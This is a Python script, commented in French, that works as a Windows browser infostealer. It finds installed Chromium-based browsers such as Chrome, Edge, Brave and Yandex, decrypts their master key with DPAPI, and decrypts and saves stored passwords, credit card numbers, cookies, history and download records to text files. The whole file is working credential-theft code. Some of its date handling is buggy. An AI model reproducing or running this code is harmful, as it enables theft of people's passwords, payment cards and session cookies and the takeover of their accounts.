import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
appdata = os.getenv("LOCALAPPDATA")

navigateurs = { # en gros les navigateurs qui stockent les données dans des fichiers accessibles facilement
    "avast": appdata + r"\AVAST Software\Browser\User Data",
    "amigo": appdata + r"\Amigo\User Data",
    "brave": appdata + r"\BraveSoftware\Brave-Browser\User Data",
    "cent-browser": appdata + r"\CentBrowser\User Data",
    "epic-privacy-browser": appdata + r"\Epic Privacy Browser\User Data",
    "google-chrome": appdata + r"\Google\Chrome\User Data",
    "google-chrome-sxs": appdata + r"\Google\Chrome SxS\User Data",
    "iridium": appdata + r"\Iridium\User Data",
    "kometa": appdata + r"\Kometa\User Data",
    "microsoft-edge": appdata + r"\Microsoft\Edge\User Data",
    "orbitum": appdata + r"\Orbitum\User Data",
    "sputnik": appdata + r"\Sputnik\Sputnik\User Data",
    "torch": appdata + r"\Torch\User Data",
    "uran": appdata + r"\uCozMedia\Uran\User Data",
    "vivaldi": appdata + r"\Vivaldi\User Data",
    "yandex": appdata + r"\Yandex\YandexBrowser\User Data",
    "7star": appdata + r"\7Star\7Star\User Data",
}
data_queries = {
    "données_de_connection": {
        "query": "SELECT action_url, username_value, password_value FROM logins",
        "file": r"\Login Data",
        "columns": ["URL", "Email/Nom d'utilisateur", "Mot de passe"],
        "decrypt": True
    },
    "cartes_de_crédit": {
        "query": "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards",
        "file": r"\Web Data",
        "columns": ["Nom sur la carte", "Numéro de carte", "Mois d'expiration", "Année d'expiration"],
        "decrypt": True
    },
    "cookies": {
        "query": "SELECT host_key, name, path, encrypted_value FROM cookies",
        "file": r"\Network\Cookies",
        "columns": ["Clé d'origine", "Nom du cookie", "Chemin", "Cookie"],
        "decrypt": True
    },
    "historiques": {
        "query": "SELECT url, title, last_visit_time FROM urls",
        "file": r"\History",
        "columns": ["URL", "Titre", "Date de visite"],
        "decrypt": False
    },
    "téléchargements": {
        "query": "SELECT tab_url, target_path FROM downloads",
        "file": r"\History",
        "columns": ["URL de téléchargement", "Chemin local"],
        "decrypt": False
    }
}

def crypt_key(chemin):
    """Renvoie la clé de cryptage du navigateur"""
    if not os.path.exists(chemin): # si le chemin n'existe pas
        return
    
    if "os_crypt" not in open(chemin + r"\Local State", "r", encoding="utf-8").read(): # si la clé ne se trouve pas dans le fichier
        return
    
    with open(chemin + r"\Local State", "r", encoding="utf-8") as fichier:
        contenu = fichier.read()
    local_state = json.loads(contenu)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]

    return key

def decrypt_mdp(buff, key):
    """Renvoie un mdp décrypté à partir du mdp crypté et de la clé de décryptage"""
    iv = buff[3:15] # iv = vecteur d'initialisation
    payload = buff[15:] # payload = partie utile 
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_mdp = cipher.decrypt(payload)
    decrypted_mdp = decrypted_mdp[:-16].decode()

    return decrypted_mdp

def save(nav_name, type_de_données, contenu):
    """enregistrer le données dans un fichier"""
    if not os.path.exists(nav_name): # si le dossier n'existe pas, il le crée
        os.mkdir(nav_name)
    if contenu is not None:
        open(f"{nav_name}/{type_de_données}.txt", "w", encoding="utf-8").write(contenu)
        print(f"\t [*] Données enregistrées dans {nav_name}/{type_de_données}.txt")
    else:
        print(f"\t [-] Aucune donnée trouvée !")

def get_data(chemin, profil, key, type_de_données):
    """Récupérer les données voulues"""
    db_file = f"{chemin}\\{profil}{type_de_données['file']}"
    if not os.path.exists(db_file): # au cas où le fichier a été supprimé
        return
    result = ""
    shutil.copy(db_file, "temp_db")
    conn = sqlite3.connect("temp_db")
    cursor = conn.cursor()
    cursor.execute(type_de_données["query"])
    for row in cursor.fetchall():
        row = list(row)
        if type_de_données["decrypt"]:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_mdp(row[i], key)
        try:
            if data_type_name == "historiques":
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "0"
            if data_type_name == "cartes_de_crédit":
                if row[4] != 0:
                    row[4] = convert_chrome_time(row[4])
                else:
                    row[4] = "0"
            if data_type_name == "cookies":
                if row[6] != 0:
                    row[6] = convert_chrome_time(row[5])
                else:
                    row[6] = "0"
        except IndexError:
            pass
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_de_données["columns"], row)]) + "\n\n"
    conn.close()
    os.remove("temp_db")
    return result


def convert_chrome_time(chrome_time):
    """Convertir le format bizarre des dates stockées par les navigateurs en date normale"""
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime("%d/%m/%Y %H:%M:%S")

def navigateurs_installés():
    """Renvoie la liste des navigateurs installés sur l'ordinateur."""
    installés = []
    for i in navigateurs.keys():
        if os.path.exists(navigateurs[i]):
            installés.append(i)

    return installés




# Code principal
available_browsers = navigateurs_installés()

for browser in available_browsers:
    browser_path = navigateurs[browser]
    master_key = crypt_key(browser_path)
    print(f"Récupération des informations de {browser}")

    for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Recupération des {data_type_name.replace('_', ' ').capitalize()}")
            try:
                data = get_data(browser_path, "Default", master_key, data_type)
                save(browser, data_type_name, data)
            except PermissionError:
                print("\t [#] Permissions refusées")
            print("\t------\n")